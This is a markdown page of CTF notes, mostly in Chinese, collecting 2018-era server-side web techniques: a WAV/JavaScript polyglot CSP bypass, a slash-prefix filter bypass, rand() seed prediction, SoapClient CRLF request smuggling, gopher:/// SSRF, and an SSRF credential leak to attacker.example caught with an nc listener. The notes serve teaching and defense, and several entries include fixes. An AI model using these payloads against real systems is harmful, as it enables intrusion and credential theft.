# CTF Web - Advanced Server-Side Techniques (Part 3)

偏向 CVE 时代与 2018 年前后的高级服务端技巧（CSAW、35C3、ASIS、PlaidCTF）。第 1-2 部分见 [server-side-advanced.md](server-side-advanced.md) 与 [server-side-advanced-2.md](server-side-advanced-2.md)。

## Table of Contents
- [WAV Polyglot Upload Bypass via .wave Extension (PlaidCTF 2018)](#wav-polyglot-upload-bypass-via-wave-extension-plaidctf-2018)
- [Multi-Slash URL Parser `path.startswith` Bypass (CSAW 2018 Finals)](#multi-slash-url-parser-pathstartswith-bypass-csaw-2018-finals)
- [Xalan XSLT math:random() Seed Guess (35C3 2018)](#xalan-xslt-mathrandom-seed-guess-35c3-2018)
- [SoapClient _user_agent CRLF Method Smuggling (35C3 2018)](#soapclient-_user_agent-crlf-method-smuggling-35c3-2018)
- [`gopher://` No-Host URL Scheme Bypass (35C3 2018)](#gopher-no-host-url-scheme-bypass-35c3-2018)
- [SSRF Credential Leak via Attacker-Specified Outbound URL (ASIS Finals 2018)](#ssrf-credential-leak-via-attacker-specified-outbound-url-asis-finals-2018)

---

---

## WAV Polyglot Upload Bypass via .wave Extension (PlaidCTF 2018)

**模式（idIoT: Action）：** 站点允许上传 `ogg/wav/wave/webm/mp3`，并通过解析 RIFF/WAVE 头做校验。CSP 为 `script-src 'self'`，所以普通内联 XSS 会失败，但若能把上传文件当作同源脚本通过 `<script src=...>` 加载，就能执行。浏览器通常拒绝 `Content-Type` 以 `audio/` 开头的响应作为脚本加载；而很多发行版里的 Apache 并未给 `.wave` 扩展配置 MIME 映射，会退回默认类型（通常是 `application/octet-stream`，或干脆没有 `Content-Type`）。

**构造方法：**
1. 做一个前几字节能被解析为合法 RIFF/WAVE 容器的文件，同时在 `data` chunk 中打开 JavaScript 块注释并嵌入载荷。
2. 保存为 `.wave` 而不是 `.wav`，让 Apache 不把它标记为音频。
3. 再通过现有 XSS sink 注入 `<script src="/uploads/evil.wave"></script>`。浏览器会把它当作同源脚本执行，从而满足 `script-src 'self'`。

```text
RIFF=1/*WAVEfmt ..........]................LIST....INFO
ISFT....Lavf57.83.100.data........................
........*/ ; alert(1);
```
十六进制视图（截断）：前 4 字节 `52 49 46 46` 仍然是 `RIFF`；诡异的长度字段 `3d 31 2f 2a`（`=1/*`）对 WAV 解析器仍可接受，但同时也为 JS 打开了注释，直到数据尾部 `*/ ;alert(1);` 才结束并执行。

**关键点：** 只检查 magic bytes 或仅依赖扩展名/MIME 的文件上传过滤器，很容易被“服务器未明确映射的扩展名”绕过。允许的扩展名都应该对照服务器 MIME 数据库（如 `mime.types`）逐个验证；一旦某个扩展落到 `application/octet-stream`，它在 `script-src 'self'` 下就可能变成脚本 gadget。修复方式是对用户上传统一强制 `Content-Type: application/octet-stream`，并搭配 `Content-Disposition: attachment`。

**参考：** PlaidCTF 2018 — writeup 10018

---

## Multi-Slash URL Parser `path.startswith` Bypass (CSAW 2018 Finals)

**模式：** 服务端拒绝解析后路径以 `/flaginfo` 开头的 URL，但大多数 HTTP 栈会把连续多个斜杠解析到同一真实路由。额外多加一个斜杠，就会让解析路径变成 `//flaginfo`，从而绕过 `startswith("/flaginfo")`，但最终仍路由到真实端点。

```text
# Filtered
http://127.0.0.1:5000/flaginfo
# Allowed
http://127.0.0.1:5000///flaginfo
```

**关键点：** 过滤器检查的“解析后 URL”与实际路由器解析的结果可能不同。只要是字符串前缀判断而非结构化匹配，就应测试 `///`、`/./`、`%2f`、`http:/127.0.0.1` 等变体。

**参考：** CSAW 2018 Finals — NekoCat, writeups 12130, 12144

---

## Xalan XSLT math:random() Seed Guess (35C3 2018)

**模式：** Xalan 的 `math:random()` 扩展底层直接调用 C 的 `srand(time(NULL))`。题目泄露了连续 5 个随机值；只需用 libc `rand()` 暴力三种可能种子（`t-1`、`t`、`t+1`），找到匹配值序列的那个种子，再预测后续随机数。

```c
for (long base = time(NULL) - 1; base <= time(NULL) + 1; base++) {
    srand(base);
    for (int j = 0; j < 5; j++) {
        long long v = llround((double)rand() / RAND_MAX * 4294967296.0);
        /* compare with leaked values */
    }
}
```

**关键点：** 暴露数学扩展的 XSLT 引擎，往往只是简单代理到底层 libc 的 `rand/srand`。而 seed 只有秒级时间粒度，通常三次尝试就够。

**参考：** 35C3 CTF 2018 — Juggle, writeup 12803

---

## SoapClient _user_agent CRLF Method Smuggling (35C3 2018)

**模式：** PHP `SoapClient` 允许用户设置 `_user_agent`。这个字符串会原样插入 HTTP 请求里，且没有过滤 CRLF。于是注入 `\r\n\r\n` 再拼上一整条 HTTP 请求，就能在同一 TCP 连接上走私第二个请求，把原本只能发 POST 的原语扩展成 GET 或任意方法，并访问仅本地可达的管理接口。

```php
$c = new SoapClient(null, [
    'location'   => 'http://target/soap',
    'uri'        => 'x',
    'user_agent' => "x\r\nX-Forwarded-For: 127.0.0.1\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
]);
$c->__soapCall('x', []);
```

**关键点：** 任何允许你在可反序列化对象里设置“魔术 HTTP 头字符串”的 gadget，都可能演化成 HTTP request smuggling。PHP 里常见的就是 `SoapClient->_user_agent` 和 `SoapClient->_cookies`。

**参考：** 35C3 CTF 2018 — post, writeup 12808

---

## `gopher://` No-Host URL Scheme Bypass (35C3 2018)

**模式：** 某个 allowlist 校验器只在 URL 含 host 时才检查 scheme（伪代码类似 `parsed.scheme in ('http','https') if parsed.host`）。而 `gopher:///host:port/data` 在部分解析器里 host 为空，于是直接跳过校验，后端却仍会按 gopher 协议与任意 TCP 服务通信，例如 MSSQL、Redis、SMTP。

```text
gopher:///127.0.0.1:1433/_<raw TDS bytes>
```

**关键点：** URL 解析器与校验器之间的语义不对齐通常具有非对称性。所有 scheme 都应同时测试“带 host”和“不带 host”的写法，常见绕过包括 `gopher:///x`、`file:///x`、`jar:file:///x`。

**参考：** 35C3 CTF 2018 — post, writeup 12808

---

## SSRF Credential Leak via Attacker-Specified Outbound URL (ASIS Finals 2018)

**模式：** 服务器会请求用户指定的 URL，并把自身的 HTTP Basic 凭据也一并带上。只要把目标 URL 指向攻击者控制的主机，就能在入站请求中直接看到 `Authorization: Basic <base64(user:pass)>`。

```http
# Listener (attacker side)
nc -lvnp 80

# Victim sends:
GET / HTTP/1.1
Host: attacker.example
Authorization: Basic YmlnYnJvdGhlcjo0UWozcmM0WmhOUUt2N1J6
```

**关键点：** 任何 SSRF 只要客户端库会默认附带每请求凭据（如 `requests.auth`、`urllib3 auth_header`、Python `http.client` 默认认证），在“目标 URL 可由攻击者指定”时就会顺带泄露这些凭据。修复时应在重定向和外部请求上剥离 `Authorization`，并禁止默认附带敏感认证头。

**参考：** ASIS CTF Finals 2018 — Gunshop 2, writeup 12420
